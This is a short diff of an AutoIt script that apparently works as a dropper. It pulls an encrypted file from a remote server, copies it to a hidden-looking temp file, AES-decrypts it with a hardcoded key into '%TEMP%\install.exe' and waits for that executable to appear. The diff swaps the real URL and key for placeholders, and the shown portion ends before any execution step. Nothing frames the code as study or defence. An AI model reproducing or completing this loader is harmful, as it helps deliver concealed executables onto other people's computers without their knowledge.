@@ -1,6 +1,6 @@
 #Include "aes.au3"
 
-$serverFile = "http://location/install.enc"
+$serverFile = "RemoteFileLocation"
 $tmpEncFile = @TempDir & "\101_80085.enc"
 $exeFile = @TempDir & "\install.exe"
 
@@ -18,7 +18,7 @@ EndIf
 
 $r =FileCopy($tmpEncFile, @TempDir & "\.00000000")
 
-_AesDecryptFile("lolwut", @TempDir & "\.00000000", $exeFile, "CFB")
+_AesDecryptFile("AESKey", @TempDir & "\.00000000", $exeFile, "CFB")
 
 While Not FileExists($exeFile)
 	Sleep(1)
